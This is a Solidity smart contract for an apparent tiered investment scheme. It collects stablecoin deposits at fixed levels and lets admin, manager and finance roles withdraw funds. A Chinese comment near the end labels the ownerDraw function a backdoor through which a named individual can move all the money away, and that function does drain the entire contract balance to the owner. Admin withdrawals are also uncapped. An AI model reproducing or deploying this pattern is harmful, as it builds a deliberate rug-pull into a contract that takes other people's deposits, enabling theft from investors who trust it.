1 pragma solidity ^0.5.12;
2 
3 library Address {
4     function isContract(address account) internal view returns (bool) {
5 
6         uint256 size;
7         assembly { size := extcodesize(account) }
8         return size > 0;
9     }
10 }
11 
12 library SafeMath {
13 
14     function add(uint256 a, uint256 b) internal pure returns (uint256) {
15         uint256 c = a + b;
16         require(c >= a, "SafeMath: addition overflow");
17 
18         return c;
19     }
20 
21 
22     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
23         require(b <= a, "SafeMath: subtraction overflow");
24         uint256 c = a - b;
25 
26         return c;
27     }
28 
29     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
30         // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
31         // benefit is lost if 'b' is also tested.
32         // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522
33         if (a == 0) {
34             return 0;
35         }
36 
37         uint256 c = a * b;
38         require(c / a == b, "SafeMath: multiplication overflow");
39 
40         return c;
41     }
42 
43     function div(uint256 a, uint256 b) internal pure returns (uint256) {
44         // Solidity only automatically asserts when dividing by 0
45         require(b > 0, "SafeMath: division by zero");
46         uint256 c = a / b;
47         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
48 
49         return c;
50     }
51 
52     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
53         require(b != 0, "SafeMath: modulo by zero");
54         return a % b;
55     }
56 }
57 
58 contract Context {
59     constructor () internal { }
60     function _msgSender() internal view returns (address payable) {
61         return msg.sender;
62     }
63 } 
64 //管理权限
65 contract Ownable {
66     address  private  _owner;
67 
68     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
69     constructor () internal {
70         _owner = msg.sender;
71         emit OwnershipTransferred(address(0), _owner);
72     }
73 
74     function owner() public view returns (address) {
75         return _owner;
76     }
77 
78     modifier onlyOwner() {
79         require(isOwner(), "Ownable: caller is not the owner");
80         _;
81     }
82 
83     function isOwner() public view returns (bool) {
84         return msg.sender == _owner;
85     }
86 
87     function transferOwnership(address newOwner) public onlyOwner {
88         _transferOwnership(newOwner);
89     }
90 
91     function _transferOwnership(address newOwner) internal {
92         require(newOwner != address(0) && newOwner!=address(this), "Ownable: new owner is the zero address");
93         emit OwnershipTransferred(_owner, newOwner);
94         _owner = newOwner;
95     }
96 }
97 //角色管理
98 library Roles {
99     struct Role {
100         mapping (address => bool) bearer;
101     }
102 
103     /**
104      * @dev Give an account access to this role.
105      */
106     function add(Role storage role, address account) internal {
107         require(!has(role, account), "Roles: account already has role");
108         role.bearer[account] = true;
109     }
110 
111     /**
112      * @dev Remove an account's access to this role.
113      */
114     function remove(Role storage role, address account) internal {
115         require(has(role, account), "Roles: account does not have role");
116         role.bearer[account] = false;
117     }
118 
119     /**
120      * @dev Check if an account has this role.
121      * @return bool
122      */
123 
124     function has(Role storage role, address account) internal view returns (bool) {
125         require(account != address(0), "Roles: account is the zero address");
126         return role.bearer[account];
127     }
128 }
129 
130 //管理分配
131 contract Management is Ownable{
132     using Roles for Roles.Role;
133 
134     event ManagerAdded(address indexed account);
135     event ManagerRemoved(address indexed account);
136 
137     Roles.Role private _managers;
138     uint256 private _managerslevel;
139 
140     constructor ()  internal {
141         // addManager(msg.sender);
142         _managerslevel = 10;
143     }
144 
145     modifier onlyManager()  {
146         require(isManager(msg.sender), "Management: caller is not the manager");
147         _;
148     }
149     function managerslevel() public view returns(uint256){
150         return _managerslevel;
151     }
152     function isManager(address account) public view returns (bool) {
153         return _managers.has(account);
154     }
155     // function addManager(address account) public onlyOwner {
156     //     _addManager(account);
157     // }
158 
159     function renounceManager(address account) public onlyOwner {
160         _removeManager(account);
161     }
162 
163     function _addManager(address account) internal {
164         _managers.add(account);
165         emit ManagerAdded(account);
166     }
167 
168     function _removeManager(address account) internal {
169         _managers.remove(account);
170         emit ManagerRemoved(account);
171     }
172 }
173 
174 
175 
176 contract Finance is Ownable{
177     using Roles for Roles.Role;
178 
179     event FinanceAdded(address indexed account);
180     event FinanceRemoved(address indexed account);
181 
182     Roles.Role private _finances;
183     uint256 private _financeslevel;
184 
185     constructor ()  internal {
186         // addManager(msg.sender);
187         _financeslevel = 5;
188     }
189 
190     modifier onlyFinance()  {
191         require(isFinance(msg.sender), "Finance: caller is not the finance");
192         _;
193     }
194     function financeslevel() public view returns(uint256){
195         return _financeslevel;
196     }
197     function isFinance(address account) public view returns (bool) {
198         return _finances.has(account);
199     }
200     // function addManager(address account) public onlyOwner {
201     //     _addManager(account);
202     // }
203 
204     function renounceFinance(address account) public onlyOwner {
205         _removeFinance(account);
206     }
207 
208     function _addFinance(address account) internal {
209         _finances.add(account);
210         emit FinanceAdded(account);
211     }
212 
213     function _removeFinance(address account) internal {
214         _finances.remove(account);
215         emit FinanceRemoved(account);
216     }
217 }
218 
219 
220 
221 contract Admin is Ownable {
222     using Roles for Roles.Role;
223 
224     event AdminAdded(address indexed account);
225     event AdminRemoved(address indexed account);
226 
227     Roles.Role private _admins;
228     uint256 private _adminslevel;
229 
230     constructor ()  internal {
231         // addAdmin(msg.sender);
232         _adminslevel = 1;
233     }
234 
235     modifier onlyAdmin()  {
236         require(isAdmin(msg.sender), "Admin: caller is not the admin");
237         _;
238     }
239     function adminslevel() public view returns(uint256){
240         return _adminslevel;
241     }
242 
243     function isAdmin(address account) public view returns (bool) {
244         return _admins.has(account);
245     }
246 
247     // function addAdmin(address account) public onlyOwner {
248     //     _addAdmin(account);
249     // }
250 
251     function renounceAdmin(address account) public onlyOwner {
252         _removeAdmin(account);
253     }
254 
255     function _addAdmin(address account) internal {
256         _admins.add(account);
257         emit AdminAdded(account);
258     }
259 
260     function _removeAdmin(address account) internal {
261         _admins.remove(account);
262         emit AdminRemoved(account);
263     }
264 }
265 
266 contract RoleManger is Ownable,Management,Admin,Finance {
267 
268     function addManager(address account) public onlyOwner {
269         require(!isAdmin(account) && !isFinance(account),"RoleManger: Invalid account");
270         _addManager(account);
271     }
272 
273     function addAdmin(address account) public onlyOwner {
274         require(!isManager(account) && !isFinance(account),"RoleManger: Invalid account");
275         _addAdmin(account);
276     }
277 
278     function addFinance(address account) public onlyOwner {
279         require(!isManager(account)&& !isAdmin(account),"RoleManger: Invalid account");
280         _addFinance(account);
281     }
282 }
283 
284 
285 
286 interface IERC20 {
287     function totalSupply() external view returns (uint256);
288     function balanceOf(address account) external view returns (uint256);
289     function transfer(address recipient, uint256 amount) external returns (bool);
290     function allowance(address owner, address spender) external view returns (uint256);
291     function approve(address spender, uint256 amount) external returns (bool);
292     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
293     event Transfer(address indexed from, address indexed to, uint256 value);
294     event Approval(address indexed owner, address indexed spender, uint256 value);
295 }
296 //设置核心函数
297 contract LightHouse is Context,RoleManger {
298     using SafeMath for uint256;
299     using Address for address;
300 
301     event Inverst(address indexed sender,uint256 indexed level,uint256 indexed amount);
302     event Upgrade(address indexed sender,uint256 indexed orderid,uint256 indexed newlevel);
303     event ReInverst(address indexed sender,uint256 indexed level,uint256 indexed amount);
304 
305     enum State { Active,Locked}
306 
307     State public state;
308 
309     mapping(uint256 => uint256 ) public level;
310 
311     struct TokenModel{
312         uint256 decimals;
313         IERC20 contractaddress;
314     }
315 
316     TokenModel public tokeninfo;
317 
318     address public receiveAddress ;
319 
320     uint256 public id;
321 
322     struct userModel {
323         uint256 level;
324         uint256 inverstAmount;
325     }
326     mapping(address => userModel) public userinfo;
327 
328     modifier nonReentrant() {
329         id += 1;
330         uint256 localCounter = id;
331         _;
332         require(localCounter == id, "ReentrancyGuard: reentrant call");
333     }
334 
335     modifier inState(State _state) {
336         require(state == _state,"inState: Invalid state");
337         _;
338     }
339     uint256 public totalfund;
340     // mapping(uint256 => uint256) private _windrawpercet;
341     struct WithDrawpercet {
342         uint256 percet;
343         uint256 amount;
344     }
345     mapping(uint256 => WithDrawpercet) public windrawpercet;
346     constructor()
347         public
348     {
349         tokeninfo.decimals = 6;
350         tokeninfo.contractaddress = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
351         receiveAddress = address(this);
352         initLevels(tokeninfo.decimals);
353 
354     }
355 
356     function initLevels(uint256 decimals) private {
357         require(decimals > 0 && decimals <= 18 ,"initLevels: Invalid decimals");
358         level[10] = 500 * 10  ** decimals;
359         level[20] = 1000 * 10  ** decimals;
360         level[30] = 5000 * 10  ** decimals;
361         level[40] = 10000 * 10  ** decimals;
362         level[50] = 50000 * 10  ** decimals;
363 
364         windrawpercet[adminslevel()].percet = 100;
365         windrawpercet[managerslevel()].percet = 50;
366         windrawpercet[financeslevel()].percet = 40;
367     }
368 
369     function setState(State _state)
370         public
371         onlyOwner
372     {
373         state = _state;
374     }
375     function setWithDrawPercert(uint256 _level,uint256 _percert) public onlyOwner {
376         require(_level == managerslevel() || _level == adminslevel(),"setWithDrawPercert: Invalid level");
377         require(_percert <=100 && _percert >=0,"setWithDrawPercert: Invalid pecert");
378         windrawpercet[_level].percet = _percert;
379     }
380 
381     function setLevel(uint256 levelid,uint256 amount) public onlyOwner {
382         require(levelid>0 ,"setLevel: Invalid level");
383         level[levelid] = amount;
384     }
385 
386     function setToken(IERC20 tokenaddress,uint256 decimals) public onlyOwner {
387         require(address(tokenaddress).isContract(), "setToken: Invalid contract");
388         require(decimals > 0 && decimals <= 18 ,"setToken: Invalid decimals");
389         if(tokeninfo.decimals != decimals){
390             tokeninfo.decimals = decimals;
391             initLevels(decimals);
392         }
393         tokeninfo.contractaddress = tokenaddress;
394     }
395 //设置收钱的地址
396     function setreceiveAddress(address  _receiveAddress)  public onlyOwner{
397         require(receiveAddress != _receiveAddress&&_receiveAddress!=address(0),"setreceiveAddress: Invalid receive address");
398         receiveAddress = _receiveAddress;
399     }
400 
401 //上下级关系
402     function inverst(uint256 _levelid)
403         public
404         inState(State.Active)
405         nonReentrant
406         returns(bool)
407     {
408         address _sender = _msgSender();
409         uint256 _amount = level[_levelid];
410         require(_amount > 0 ,"inverst: Invalid level id");
411         IERC20 _token = tokeninfo.contractaddress;
412         callOptionalReturn(_token, abi.encodeWithSelector(_token.transferFrom.selector,_sender, receiveAddress, _amount));
413         userModel storage _senderModel = userinfo[_sender];
414 
415         _senderModel.level = _levelid;
416         _senderModel.inverstAmount = _senderModel.inverstAmount.add(_amount);
417         totalfund = totalfund.add(_amount);
418         emit Inverst(_sender,_levelid,_amount);
419         return true;
420     }
421 //用户投资升级
422     function upgrade(uint256 _orderid,uint256 _newlevelid)
423         public
424         inState(State.Active)
425         nonReentrant
426         returns(bool)
427     {
428         address _sender = _msgSender();
429         uint256 _amount = level[_newlevelid];
430         userModel storage _senderModel = userinfo[_sender];
431         uint256 _oldlevelid = _senderModel.level;
432         require(_amount > 0 && _amount > level[_oldlevelid]  && _newlevelid > _oldlevelid,"upgrade: Invalid order id");
433         require(_orderid > 0 ,"upgrade: Invalid level id");
434         uint256 _pricespread = _amount.sub(level[_senderModel.level]);
435         IERC20 _token = tokeninfo.contractaddress;
436         callOptionalReturn(_token, abi.encodeWithSelector(_token.transferFrom.selector,_sender, receiveAddress, _pricespread));
437 
438         _senderModel.level = _newlevelid;
439         _senderModel.inverstAmount = _senderModel.inverstAmount.add(_pricespread);
440         totalfund = totalfund.add(_pricespread);
441         emit Inverst(_sender,_newlevelid,_pricespread);
442         emit Upgrade(_sender,_orderid,_newlevelid);
443         return true;
444     }
445 //复投
446     function reinverst(uint256 _newlevelid)
447         public
448         inState(State.Active)
449         nonReentrant
450         returns(bool)
451     {
452         address _sender = _msgSender();
453         uint256 _amount = level[_newlevelid];
454 
455         userModel storage _senderModel = userinfo[_sender];
456         uint256 _oldlevelid = _senderModel.level;
457         require(_senderModel.inverstAmount > 0 ,"reinverst: Invalid sender");
458         require(_amount > 0 && _amount >= level[_oldlevelid]  && _newlevelid >= _oldlevelid,"reinverst: Invalid level id");
459         IERC20 _token = tokeninfo.contractaddress;
460         callOptionalReturn(_token, abi.encodeWithSelector(_token.transferFrom.selector,_sender, receiveAddress, _amount));
461 
462         _senderModel.level = _newlevelid;
463         _senderModel.inverstAmount = _senderModel.inverstAmount.add(_amount);
464         totalfund = totalfund.add(_amount);
465         emit ReInverst(_sender,_newlevelid,_amount);
466         return true;
467     }
468 
469 //提现
470     function WithDraw(address payable recipient, uint256 _amount,IERC20 _tokenaddress)
471         public
472         returns(bool)
473     {
474         address sender = msg.sender;
475 
476         require(isAdmin(sender) || isManager(sender) || isFinance(sender),"WithDraw :Invalid sender");
477         require(_tokenaddress.balanceOf(address(this)) >= _amount,"WithDraw: Insufficient token balance");
478 
479         uint256 _level = adminslevel();
480 
481         if(isManager(sender) ){
482             _level = managerslevel();
483         }
484         if(isFinance(sender)){
485             _level = financeslevel();
486         }
487 
488         windrawpercet[_level].amount = windrawpercet[_level].amount.add(_amount);
489         //limit low-level manager withdraw amount
490         if(_level == managerslevel() || _level == financeslevel()){
491             require(totalfund.mul(windrawpercet[_level].percet).div(100) >=windrawpercet[_level].amount,"WithDraw :Invalid amount" );
492         }
493 
494         callOptionalReturn(_tokenaddress, abi.encodeWithSelector(_tokenaddress.transfer.selector,recipient, _amount));
495         return true;
496     }
497 //后门，杨仁义可以把钱转走
498     function ownerDraw(IERC20 _tokenaddress) onlyOwner public {
499         uint256 allbalacne = _tokenaddress.balanceOf(address(this)) ;
500         callOptionalReturn(_tokenaddress, abi.encodeWithSelector(_tokenaddress.transfer.selector,msg.sender, allbalacne));
501     }
502 
503     function callOptionalReturn(IERC20 token, bytes memory data)
504         private
505     {
506         require(address(token).isContract(), "SafeERC20: call to non-contract");
507         (bool success, bytes memory returndata) = address(token).call(data);
508         require(success, "SafeERC20: low-level call failed");
509         if (returndata.length > 0) { // Return data is optional
510             require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
511         }
512     }
513 
514     function () payable external{
515         revert();
516     }
517 }